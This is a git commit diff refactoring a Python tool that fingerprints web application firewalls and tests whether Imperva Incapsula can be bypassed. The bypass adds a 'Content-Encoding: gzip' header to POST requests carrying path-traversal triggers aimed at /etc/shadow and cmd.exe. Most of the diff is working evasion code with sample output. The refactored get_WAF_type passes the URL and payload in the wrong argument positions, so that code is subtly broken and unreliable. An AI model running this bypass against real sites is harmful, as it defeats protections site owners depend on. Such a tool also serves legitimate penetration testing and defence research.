56e39b1f998834a75dafed1c5d3c1c68c97da637
0xhaggis <clivitt@bishopfox.com>
2021-12-12 23:25:21 -0700

    Refactored the code.

--- imperva_gzip.py
+++ imperva_gzip.py
@@ -5,27 +5,33 @@ If so, attempt to evade WAF detection by adding a 'Content-Encoding: gzip' heade
 to HTTP POST requests.
 
 Syntax:
-	./imperva_gzip.py URL
+	./imperva_gzip.py [-t] URL
 
-e.g.:
-	./imperva_gzip.py https://www.vulnerable.com/search
-	[+] Sending baseline POST request to https://www.vulnerable.com/search
-	[+] Response: HTTP 200
-	[+] Sending malicious UNIX payload to trigger the WAF...
-	[+] WAF (type: Imperva Incapsula) is blocking malicious UNIX payloads with HTTP 403. This is good!
-	[+] Sending malicious Windows payload to trigger the WAF...
-	[+] WAF (type: Imperva Incapsula) is blocking malicious Windows payloads with HTTP 403. This is good!
+Guess the WAF type for a given URL:
+	$ ./imperva_gzip.py -t https://www.vulnerable.com/search
+	Imperva Incapsula
+	$ ./imperva_gzip.py -t https://www.wordpress-user.com/login
+	WordFence
+	$ ./imperva_gzip.py -t https://www.cloudflare-customer.com
+	Cloudflare
+
+Check to see if the WAF is vulnerable to the gzip bypass:
+	$ ./imperva_gzip.py https://www.vulnerable.com/search
+	[+] Can we make POST requests to https://www.vulnerable.com/search?
+	[+] Checking for Imperva WAF...
 	[+] Attempting gzip bypass for UNIX trigger...
-	[+] Vulnerable! HTTP 200
+	[+] Vulnerable! HTTP response code: 200
 	[+] Attempting gzip bypass for Windows trigger...
-	[+] Vulnerable! HTTP 200
+	[+] Vulnerable! HTTP response code: 200
+
 
 You can script this tool and check the exit code in the caller:
-	1: No URL specified on command-line.
+	0: Returned after getting WAF type.
+	1: Command-line was invalid.
 	2: There was an error connecting. Could be DNS error, timeout, etc.
 	3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
-	4: The baseline POST request didn't return HTTP 200.
-	128: There is a WAF, but it is not vulnerable to the gzip bypass.
+	4: A WAF was detected, but it wasn't Imperva.
+	128: There is an Imperva WAF, but it is not vulnerable to the gzip bypass.
 	129: The bypass was effective for the UNIX payload, but not the Windows one.
 	130: The bypass was effective for the Windows payload, but not the UNIX one.
 	131: The bypass was effective against both Windows and UNIX payloads.
@@ -49,170 +55,146 @@ import sys
 import requests
 from time import sleep
 
-# we're ignoring invalid SSL certs and it's noisy
-requests.packages.urllib3.disable_warnings()
-
 payloadBaseline = {'foo': 'bar'}
 payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
 payloadWindowsTrigger  = {'foo': 'bar', 'test': '../../../../../Windows/System32/cmd.exe'}
 
-# helpers
-def make_request(url, data, headers={}):
-	try:
-		r = requests.post(url, data=data, timeout=5, verify=False, headers=headers, allow_redirects=False)
-		return r
-	except:
-		print('[!] Error connecting to %s' % url)
+class ImpervaBypass:
+	def __init__(self, URL):
+		requests.packages.urllib3.disable_warnings() # turn off verbose SSL warnings
+		self.URL = URL
+		self.WAFType = ''
 
-	exit(2)
+	def make_request(self, data, headers={}):
+		try:
+			r = requests.post(self.URL, data=data, timeout=5, verify=False, headers=headers, allow_redirects=False)
+			return r
+		except:
+			print('[!] Error connecting to %s' % self.URL)
+			exit(2)
 
-def get_WAF_type(response):
-	if 'x-cnection' in response.headers:
-		return 'BigIP'
+	def get_WAF_type(self):
+		if self.WAFType != '':
+			return self.WAFType
 
-	if 'x-binarysec-nocache' in response.headers:
-		return 'BinarySec'
+		payloads = [payloadUnixTrigger, payloadWindowsTrigger]
+		for i in range(len(payloads)):
+			r = self.make_request(self.URL, payloads[i])
+			try:
+				r.raise_for_status()
+				if i == len(payloads) - 1:
+					self.WAFType = 'None'
+			except:
+				if 'x-cnection'				in r.headers: self.WAFType = 'BigIP'
+				if 'x-binarysec-nocache' 	in r.headers: self.WAFType = 'BinarySec'
+				if 'nncoection' 			in r.headers: self.WAFType = 'NetScaler'
+				if 'cneonction' 			in r.headers: self.WAFType = 'NetScaler'
+				
+				if 'Server' in r.headers:
+					if r.headers['Server'] == 'BigIP': 			  self.WAFType = 'BigIP'
+					if r.headers['Server'] == 'F5-TrafficShield': self.WAFType = 'F5 Traffic Shield'			
+					if 'WebKnight' 	in r.headers['Server']: 	  self.WAFType = 'WebKnight'
+					if 'BinarySEC' 	in r.headers['Server']: 	  self.WAFType = 'BinarySec'
+					if 'Profense' 	in r.headers['Server']: 	  self.WAFType = 'Profense'
+					if 'Cloudflare' in r.headers['Server']: 	  self.WAFType = 'Cloudflare'
+					if 'awselb/' 	in r.headers['Server']: 	  self.WAFType = 'AWS ELB'
 
-	if 'nncoection' in response.headers:
-		return 'NetScaler'
+				if 'Set-Cookie' in r.headers:
+					if 'barra_counter' in r.headers['Set-Cookie']: self.WAFType = 'Barracuda'
+					if 'sessioncookie' in r.headers['Set-Cookie']: self.WAFType = 'Denyall'
+					if 'NSC_' 		   in r.headers['Set-Cookie']: self.WAFType = 'NetScaler'
+					if 'AL_LB' 		   in r.headers['Set-Cookie']: self.WAFType = 'Airlock'
+					if 'AL_SESS' 	   in r.headers['Set-Cookie']: self.WAFType = 'Airlock'		
+					if 'ASINFO'  	   in r.headers['Set-Cookie']: self.WAFType = 'F5 Traffic Shield'
+					if 'st8id'   	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'st8_wlf' 	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'st8_wat' 	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'PLBSID'  	   in r.headers['Set-Cookie']: self.WAFType = 'Profense'
 
-	if 'cneonction' in response.headers:
-		return 'NetScaler'
+				for k in knownWAFs:
+					if k in r.text:
+						self.WAFType = knownWAFs[k]
+						break
 
-	if 'Server' in response.headers:
-		if response.headers['Server'] == 'BigIP':
-			return 'BigIP'
+				if self.WAFType != '':
+					break
 
-		if 'WebKnight' in response.headers['Server']:
-			return 'WebKnight'
+		if self.WAFType == '':
+			self.WAFType = 'Unknown'
 
-		if 'BinarySEC' in response.headers['Server']:
-			return 'BinarySec'
-	
-		if response.headers['Server'] == 'F5-TrafficShield':
-			return 'F5 Traffic Shield'			
+		return self.WAFType
 
-		if 'Profense' in response.headers['Server']:
-			return 'Profense'
+	# Returns array (successFail, httpResponseStatusCode)
+	def baseline_request(self):
+		try:
+			r = self.make_request(payloadBaseline)
+			r.raise_for_status()
+			return (True, r.status_code)
+		except requests.exceptions.HTTPError:
+			return (False, r.status_code)
 
-		if 'Cloudflare' in response.headers['Server']:
-			return 'Cloudflare'
-
-		if 'awselb/' in response.headers['Server']:
-			return 'AWS ELB'
-
-
-	if 'Set-Cookie' in response.headers:
-		if 'barra_counter_session' in response.headers['Set-Cookie']:
-			return 'Barracuda'
-
-		if 'sessioncookie' in response.headers['Set-Cookie']:
-			return 'Denyall'
-
-		if 'NSC_' in response.headers['Set-Cookie']:
-			return 'NetScaler'
-
-		if 'AL_LB' in response.headers['Set-Cookie']:
-			return 'Airlock'
-
-		if 'AL_SESS' in response.headers['Set-Cookie']:
-			return 'Airlock'		
-
-		if 'ASINFO' in response.headers['Set-Cookie']:
-			return 'F5 Traffic Shield'
-
-		if 'st8id' in response.headers['Set-Cookie']:
-			return 'Teros / Citrix Application Firewall Enterprise'
-
-		if 'st8_wlf' in response.headers['Set-Cookie']:
-			return 'Teros / Citrix Application Firewall Enterprise'
-
-		if 'st8_wat' in response.headers['Set-Cookie']:
-			return 'Teros / Citrix Application Firewall Enterprise'
-
-		if 'PLBSID' in response.headers['Set-Cookie']:
-			return 'Profense'
-
-	for k in knownWAFs:
-		if k in response.text:
-			return knownWAFs[k]
-
-	return "unknown"
+	def is_vulnerable(self, payload):
+		try:
+			r = self.make_request(payload, headers={'Content-Encoding': 'gzip'})
+			r.raise_for_status()
+			return (True, r.status_code)
+		except requests.exceptions.HTTPError:
+			return (False, r.status_code)
 
 
-# sanity check
+# If -t is passed on the commandline then guess the remote WAF type and exit.
+if len(sys.argv) == 3 and sys.argv[1] == '-t':
+	print(ImpervaBypass(sys.argv[2]).get_WAF_type())
+	exit(0)
+
+#
+# On with the show!
+#
 if len(sys.argv) != 2:
-	print("%s http(s)://www.example.com/" % sys.argv[0])
+	print("%s [-t] http(s)://www.example.com/" % sys.argv[0])
 	exit(1)
 
+imp = ImpervaBypass(sys.argv[1])
 
-# baseline request
-print("[+] Sending baseline POST request to %s" % sys.argv[1])
-try:
-	r = make_request(sys.argv[1], payloadBaseline)
-	r.raise_for_status()
-	print("[+] Response: HTTP %d" % r.status_code) 
-except requests.exceptions.HTTPError:
-	print("[!] Error POSTing to %s. HTTP response code: %d" % (sys.argv[1], r.status_code))
-	print("[!] Make sure the specified URL accepts POST requests.")
+# Verify we can make POST requests. No POST, no worky.
+print("[+] Can we make POST requests to %s?" % imp.URL)
+(success, status) = imp.baseline_request()
+if success == False:
+	print("[!] Can't POST to %s. HTTP response code: %d" % (imp.URL, status))
+	exit(2)
+
+# Get the WAF type and abort if it's not Imperva.
+print("[+] Checking for Imperva WAF...")
+if imp.get_WAF_type() == 'None':
+	print("[!] It looks like there is no WAF protecting %s" % imp.URL)
+	exit(3)
+elif imp.get_WAF_type() != 'Imperva Incapsula':
+	print("[!] Imperva wasn't detected. WAF type: %s" % imp.get_WAF_type())
 	exit(4)
 
+# Imperva will stall for a few seconds if we make a request
+# immediately after causing get_WAF_type.
+sleep(0.5)
 
-# Imperva-triggering request (UNIX)
-impervaTriggered = 0x00
-try:
-	print("[+] Sending malicious UNIX payload to trigger the WAF...")
-	r = make_request(sys.argv[1], payloadUnixTrigger)
-	r.raise_for_status()
-	print("[!] Looks like no WAF protection against the UNIX payload. HTTP response: %d" % r.status_code)
-except requests.exceptions.HTTPError:
-	# a failed request means it was blocked
-	impervaTriggered = impervaTriggered | 1
-	print("[+] WAF (type: %s) is blocking malicious UNIX payloads with HTTP %d. This is good!" % (get_WAF_type(r), r.status_code))
-
-# Imperva-triggering request (Windows)
-try:
-	print("[+] Sending malicious Windows payload to trigger the WAF...")
-	r = make_request(sys.argv[1], payloadWindowsTrigger)
-	r.raise_for_status()
-	print("[!] Looks like no WAF protection against the Windows payload. HTTP response: %d" % r.status_code) 
-except requests.exceptions.HTTPError:
-	# a failed request means it was blocked
-	impervaTriggered = impervaTriggered | 2
-	print("[+] WAF (type: %s) is blocking malicious Windows payloads with HTTP %d. This is good!" % (get_WAF_type(r), r.status_code))
-
-
-# There's no point continuing if there isn't a WAF. 
-if not impervaTriggered:
-	print('[!] It looks like there is no WAF protecting %s.' % sys.argv[1])
-	exit(3)
-
-waf = get_WAF_type(r)
-if waf != 'Imperva Incapsula':
-	print('[!] The WAF is not Incapsula. Found: %s' % waf)
-	exit(5)
-
-# Bypass requests
-sleep(.5)
+# Run the two bypass attempts. 
+# First with a UNIX WAF trigger.
+# Then with a Windows WAF trigger.
+print('[+] Attempting gzip bypass for UNIX trigger...')
 exitCode = 128
-if impervaTriggered & 1 == 1:
-	try:
-		print('[+] Attempting gzip bypass for UNIX trigger...')
-		r = make_request(sys.argv[1], payloadUnixTrigger, headers={'Content-Encoding': 'gzip'})
-		r.raise_for_status()
-		print('[+] Vulnerable! HTTP %d' % r.status_code)
-		exitCode = exitCode | 1
-	except requests.exceptions.HTTPError:
-		print('[-] Not vulnerable. HTTP %d' % r.status_code)
+(success, status) = imp.is_vulnerable(payloadUnixTrigger)
+if success == False:
+	print("[-] Not vulnerable. HTTP response code: %d" % status)
+else:
+	print("[+] Vulnerable! HTTP response code: %d" % status)
+	exitCode = exitCode | 1
 
-if impervaTriggered & 2 == 2:
-	try:
-		print('[+] Attempting gzip bypass for Windows trigger...')
-		r = make_request(sys.argv[1], payloadWindowsTrigger, headers={'Content-Encoding': 'gzip'})
-		r.raise_for_status()
-		print('[+] Vulnerable! HTTP %d' % r.status_code)
-		exitCode = exitCode | 2
-	except requests.exceptions.HTTPError:
-		print('[-] Not vulnerable. HTTP %d' % r.status_code)
+print('[+] Attempting gzip bypass for Windows trigger...')
+(success, status) = imp.is_vulnerable(payloadWindowsTrigger)
+if success == False:
+	print("[-] Not vulnerable. HTTP response code: %d" % status)
+else:
+	print("[+] Vulnerable! HTTP response code: %d" % status)
+	exitCode = exitCode | 2
 
+# So long and thanks for all the fish
 exit(exitCode)
